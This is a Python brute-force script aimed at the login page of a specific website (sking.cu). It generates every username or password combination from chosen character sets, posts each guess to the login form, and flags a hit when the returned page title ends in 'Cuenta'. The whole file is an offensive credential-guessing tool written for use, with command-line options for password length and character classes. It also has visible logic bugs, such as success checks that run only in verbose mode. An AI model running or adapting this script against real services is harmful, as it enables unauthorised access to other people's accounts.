import requests,argparse,time,string,itertools,sys
from bs4 import BeautifulSoup


args = None
URL = 'https://sking.cu/es/login'
payload = {	"username":"","password":""}

def force_user():
	DICCI_NUM = string.digits 
	DICCI_LET_USER = string.ascii_lowercase
	DICCI_LET_PASS = string.ascii_letters
	if args.numu:
		DICCI_LET_USER+=DICCI_NUM
	usuarios_bruta = (itertools.product(DICCI_LET_USER,repeat=args.charauser))
	payload['password'] = args.passw
	for usuario in usuarios_bruta:
		usuario = ",".join(usuario).replace(',','')
		payload['username'] = usuario
		res = requests.post(URL,data=payload)
		soup = BeautifulSoup(res.text,"html.parser")
		if args.verbose:
			print("User:"+payload['username']+" Password:"+payload['password'])
			respuesta = soup.title.text.split(" ")[-1]
			if(respuesta == 'Cuenta'):
				print("*"*30)
				print("Find user....")
				print("User:"+payload['username']+" Password:"+payload['password'])	
				print("*"*30)
				time.sleep(20)


def force_pass():
	DICCI_NUM = string.digits 
	DICCI_LET_USER = string.ascii_lowercase
	DICCI_LET_PASS = string.ascii_letters
	if args.numo:
		passw_bruta = list((itertools.product(DICCI_NUM,repeat=args.charapass)))
		force(passw_bruta)
	if args.numo and args.mayus:
		DICCI_LET_PASS+=DICCI_NUM
		passw_bruta = (itertools.product(DICCI_LET_PASS,repeat=args.charapass))
		force(passw_bruta)
	if args.numo and not args.mayus:
		DICCI_NUM+=DICCI_LET_USER
		passw_bruta = (itertools.product(DICCI_NUM,repeat=args.charapass))
		force(passw_bruta)
	if args.mayus:
		passw_bruta = list((itertools.product(DICCI_LET_PASS,repeat=args.charapass)))
		force(DICCI_LET_PASS)
	passw_bruta = (itertools.product(DICCI_NUM,repeat=args.charapass))
	force(passw_bruta)	
	

def force(passw_brute):
	payload['username'] = args.user
	for password in passw_brute:
		password = ",".join(password).replace(',','')
		payload['password'] = password
		res = requests.post(URL,data=payload)
		soup = BeautifulSoup(res.text,"html.parser")
		if args.verbose:
			print("User:"+payload['username']+" Password:"+payload['password'])
			respuesta = soup.title.text.split(" ")[-1]
			if(respuesta == 'Cuenta'):
				print("*"*30)
				print("Find password....")
				print("User:"+payload['username']+" Password:"+payload['password'])	
				print("*"*30)
				time.sleep(20)

def prove():
	payload['username'] = str(input("User:"))
	payload['password'] = str(input("Password:"))
	res = requests.post(URL,data=payload)
	soup = BeautifulSoup(res.text,"html.parser")
	respuesta = soup.title.text.split(" ")[-1]
	if(respuesta == 'Cuenta'):
		print("*"*30)
		print("Find user....")
		print("User:"+payload['username']+" Password:"+payload['password'])	
		print("*"*30)
		sys.exit(1)
	else:
		print("User not found....")


if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument('-u','--user',type=str,help="Text to user name")
	parser.add_argument('-p','--passw',type=str,help="text to password name")
	parser.add_argument('-cu','--charauser',default=8,type=int,help="Text to size user (default:8)")
	parser.add_argument('-cp','--charapass',default=8,type=int,help="Text to size password (default:8)")
	parser.add_argument('-M','--mayus',action='store_true',default=False,help="The password has capital letters")	
	parser.add_argument('-Nu','--numu',action='store_true',default=False,help="The user has numbers")
	parser.add_argument('-Np','--nump',action='store_true',default=False,help="The password has numbers")
	parser.add_argument('-No','--numo',action='store_true',default=False,help="The password has only numbers")
	parser.add_argument('-v','--verbose',action='store_true',default=False,help="Show all the prosces")
	parser.add_argument('-Pp','--prove',action='store_true',default=False,help="Prove with your user and password")
	args = parser.parse_args()

	if args.prove:
		prove()
	if args.user == None and args.passw:
		force_user()		
	if args.passw == None and args.user:
		force_pass()